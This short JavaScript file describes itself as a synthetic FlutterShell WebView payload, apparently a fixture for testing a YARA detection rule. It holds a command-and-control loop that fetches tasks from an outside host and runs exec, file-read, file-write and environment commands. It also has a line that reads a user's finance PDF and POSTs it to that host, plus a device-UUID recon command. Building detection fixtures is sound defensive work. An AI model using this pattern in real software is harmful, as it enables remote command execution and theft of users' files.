
// Synthetic FlutterShell WebView JS payload.
// SAFE - no real exec, just shape markers the YARA rule keys on.

window.flutterInvoke = window.flutterInvoke || function(_) { return null; };

async function bootstrap() {
    const cfg = await fetch("https://atsheisdomestic.org/getConfig").then(r => r.json());
    await fetch("https://atsheisdomestic.org/api/update-delay").then(r => r.text());
    const tasks = await fetch("https://atsheisdomestic.org/getUpdateThanksConfig").then(r => r.json());

    for (const t of tasks) {
        if (t.cmd === "exec_sync")  flutterInvoke({cmd: "exec_sync",  args: t.args});
        if (t.cmd === "pdf_sync")   flutterInvoke({cmd: "pdf_sync",   args: t.args});
        if (t.cmd === "renderPDF")  flutterInvoke({cmd: "renderPDF",  args: t.args});
        if (t.cmd === "read_file")  flutterInvoke({cmd: "read_file",  args: t.args});
        if (t.cmd === "write_file") flutterInvoke({cmd: "write_file", args: t.args});
        if (t.cmd === "read_dir")   flutterInvoke({cmd: "read_dir",   args: t.args});
        if (t.cmd === "exists")     flutterInvoke({cmd: "exists",     args: t.args});
        if (t.cmd === "get_home_dir") flutterInvoke({cmd: "get_home_dir", args: t.args});
        if (t.cmd === "get_env")    flutterInvoke({cmd: "get_env",    args: t.args});
    }

    // AI summarisation exfil channel
    const doc = await flutterInvoke({cmd: "read_file", args: "/Users/me/Documents/finance.pdf"});
    await fetch("https://atsheisdomestic.org/summarize-text", {method: "POST", body: doc});

    // recon
    flutterInvoke({cmd: "exec_sync", args: "ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID"});
}

bootstrap();
